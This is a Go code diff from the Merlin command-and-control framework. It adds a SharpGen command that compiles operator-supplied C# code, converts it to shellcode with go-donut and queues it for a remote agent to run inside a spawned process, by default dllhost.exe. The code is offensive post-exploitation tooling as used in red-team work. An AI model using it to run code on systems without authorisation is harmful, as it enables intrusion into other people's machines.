@@ -22,6 +22,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 
@@ -31,7 +32,9 @@ import (
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg/agents"
 	"github.com/Ne0nd0g/merlin/pkg/api/messages"
+	"github.com/Ne0nd0g/merlin/pkg/core"
 	"github.com/Ne0nd0g/merlin/pkg/modules/donut"
+	"github.com/Ne0nd0g/merlin/pkg/modules/sharpgen"
 	"github.com/Ne0nd0g/merlin/pkg/modules/shellcode"
 	"github.com/Ne0nd0g/merlin/pkg/modules/winapi/createprocess"
 )
@@ -368,6 +371,65 @@ func SetSkew(agentID uuid.UUID, Args []string) messages.UserMessage {
 		return messages.JobMessage(agentID, job)
 	}
 	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent SetSkew call: %s", Args))
+}
+
+// SharpGen generates a .NET core assembly, converts it to shellcode with go-donut, and executes it in the spawnto process
+func SharpGen(agentID uuid.UUID, Args []string) messages.UserMessage {
+	// Set the assembly filepath
+	options := make(map[string]string)
+
+	if len(Args) > 1 {
+		options["code"] = fmt.Sprintf("Console.WriteLine(%s);", Args[1])
+	} else {
+		return messages.ErrorMessage("code must be provided for the SharpGen module")
+	}
+
+	// Set the SpawnTo path
+
+	if len(Args) > 2 {
+		options["spawnto"] = Args[2]
+	} else {
+		options["spawnto"] = "C:\\WIndows\\System32\\dllhost.exe"
+	}
+
+	// Set the SpawnTo arguments, if any
+	if len(Args) > 3 {
+		options["args"] = Args[3]
+	} else {
+		options["args"] = ""
+	}
+
+	// Set SharpGen Module Parse() options
+	options["dotnetbin"] = "dotnet"
+	options["sharpgenbin"] = filepath.Join(core.CurrentDir, "data", "src", "cobbr", "SharpGen", "bin", "release", "netcoreapp2.1", "SharpGen.dll")
+	options["help"] = "false"
+	options["file"] = filepath.Join(core.CurrentDir, "sharpgen.exe")
+	options["dotnet"] = ""
+	options["output-kind"] = ""
+	options["platform"] = ""
+	options["no-optimization"] = "false"
+	options["assembly-name"] = ""
+	options["source-file"] = ""
+	options["class-name"] = ""
+	options["confuse"] = ""
+
+	if core.Verbose {
+		options["verbose"] = "true"
+	} else {
+		options["verbose"] = "false"
+	}
+
+	j, err := sharpgen.Parse(options)
+	if err != nil {
+		return messages.ErrorMessage(fmt.Sprintf("there was an error using the SharpGen module:\r\n%s", err))
+	}
+
+	// Add job to the Agent's queue
+	job, err := agents.AddJob(agentID, j[0], j[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
 }
 
 // Upload transfers a file from the Merlin Server to the Agent
